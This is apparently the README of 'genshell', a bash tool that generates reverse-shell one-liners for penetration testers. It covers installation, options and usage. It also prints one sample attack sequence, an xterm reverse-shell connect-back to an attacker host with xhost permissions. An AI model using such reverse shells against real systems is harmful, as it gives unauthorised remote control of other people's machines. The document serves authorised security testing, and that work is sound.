# Genshell: A bash copy-and-paste oneline reverse shell generator.

This project is deticated to ippsec. Thank you for releasing over one-hundred hours of phenomenal cybersecurity content.

Another thanks to pentestmonkey for dishing out the awesome shells!

## Forenote 
I found myself browsing other websites flagged as "malicious" for rev shells and got fed up with with security reccomendations. This script automates the generation of shells without leaving the terminal (WITH COLORS!). There will likely be  rev shells here that you have seen on other sites such as pentestmonkey, hacktricks, and other pentesting sites; if a shell from your site is used, you will be added to the "Inspirations" section in the beginning of the script. All contributions welcome. This is me giving back to the community that has shared so much with me. 

<!--
*** LOGO !![vmplayer_bx33YLqLcn](https://user-images.githubusercontent.com/68730121/106347752-dc8c6a80-628e-11eb-91e9-3e2d510b2172.png)
![Banner](https://user-images.githubusercontent.com/68730121/106348443-58d57c80-6294-11eb-8aa0-b93806259f58.png)

-->
# Genshell Output 

![vmplayer_0bpLvQBUgZ](https://user-images.githubusercontent.com/68730121/106348803-0184db80-6297-11eb-9146-6b86acea0595.png)




<!-- GETTING STARTED -->
# Installation

1. Using the GitHub repo  
   ```sh
   git clone https://github.com/djjoa/genshell.git
   cd genshell
   chmod +x gennshell
   ./genshell 
   ```
   
2. As a standalone script
   ```sh
   wget https://raw.githubusercontent.com/djjoa/genshell/main/genshell && chmod +x genshell && ./genshell
   #OR 
   curl https://raw.githubusercontent.com/djjoa/genshell/main/genshell -o genshell && chmod +x genshell && ./genshell
   ```

3. **Link the file to your path for native use with bash** (not necessary for the script to work) 
   ```sh
   # Before
   ./genshell -h 

   # After 
   sudo ln -s /genshell_install_dir/genshell /usr/local/bin/genshell 
   genshell -h
   ```
<!-- USAGE EXAMPLES -->

# Help

```sh
./genshell -h

genshell: The atomatic copy-and-paste oneline reverse shell generator. Just add args!

options:
-h|--help              Print this help menu
-b|--banner            Display the banner
-p|--port [INT]        Port you wish to cach your shell back on
-l|--LHOST [IP]        Supply TUN0 addr if not auto-parsed by the script (autoparse is set by default)
-t|--RHOST [IP]        Target IP (optional)
```

# Usage

```sh
./genshell -u
Usage: genshell [-h|--help] -p|--port [args] [-l|--LHOST [args]] [-t|--RHOST [args]] [-b|--banner]
```

# Running the Script 

When run with no arguments, the script displays the banner and help information. 

![vmplayer_HhJF2BiEUP](https://user-images.githubusercontent.com/68730121/106348709-2298fc80-6296-11eb-85c5-3502ec7fff5b.png)

# Generating Reverse Shell Templates 

To generate all reverse shell templates the `-p` or `--port` must be used. The script will attempt to automatically parse your `tun0` network adapter (assuming you are pentesting over a vpn). If it fails, the `-l` or `--LHOST` agument may be passed to manually specificy a listening network adapter. 

```sh
./genshell -p 4444
```

![vmplayer_0bpLvQBUgZ](https://user-images.githubusercontent.com/68730121/106348803-0184db80-6297-11eb-9146-6b86acea0595.png)

# Additional Arguments 
If the `-t` or `--RHOST` argument is passed the `xterm` reverse shell dialog will be displayed at the end of the script. 90% of the shell's don't require a RHOST paramter; they have been ommited by default. 

```sh
./genshell -p 4444 -l 1.1.1.1 -t 4.4.4.4
.... <snip> .... 
##################### XTERM ##################### 
The following command should be run on the server.  It will try to connect back 1.1.1.1 on TCP port 6001

xterm -display 1.1.1.1:1

To catch the incoming xterm, start an X-Server on attacker machine (:1 – which listens on TCP port 6001)

Xnest :1
xhost +4.4.4.4
```

# Usage Examples

* Generate shell templates on interface address `192.168.4.2` listening on port `4444`
```sh
./genshell --port 4444 --LHOST 192.168.4.2
./genshell  -p    4444  -l 192.168.4.2
```
* Generate shell templates with defualt `tun0` adapter listening on port 8181
```sh
./genshell --port 8181
./genshell -p 8181
```

<!-- CONTACT -->
## Contact

Enjoy the shellz! Never leave the terminal again to get exactly what you need to get the job done. 

Zer0 - [@x41x41x41x41](https://twitter.com/x41x41x41x41) - Discord Zer0#0272

Project Link: [https://github.com/djjoa/genshell](https://github.com/djjoa/genshell)



<!-- ACKNOWLEDGEMENTS -->
## Acknowledgements

* [ippsec](https://twitter.com/ippsec)
* [ippsec.rocks](https://ippsec.rocks/?#)
* [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)




<!-- MARKDOWN LINKS & IMAGES -->
<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->
[contributors-shield]: https://img.shields.io/github/contributors/djjoa/repo.svg?style=for-the-badge
[contributors-url]: https://github.com/djjoa/repo/graphs/contributors
[forks-shield]: https://img.shields.io/github/forks/djjoa/repo.svg?style=for-the-badge
[forks-url]: https://github.com/djjoa/repo/network/members
[stars-shield]: https://img.shields.io/github/stars/djjoa/repo.svg?style=for-the-badge
[stars-url]: https://github.com/djjoa/repo/stargazers
[issues-shield]: https://img.shields.io/github/issues/djjoa/repo.svg?style=for-the-badge
[issues-url]: https://github.com/djjoa/repo/issues
[license-shield]: https://img.shields.io/github/license/djjoa/repo.svg?style=for-the-badge
[license-url]: https://github.com/djjoa/repo/blob/master/LICENSE.txt
[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=for-the-badge&logo=linkedin&colorB=555
[linkedin-url]: https://linkedin.com/in/djjoa
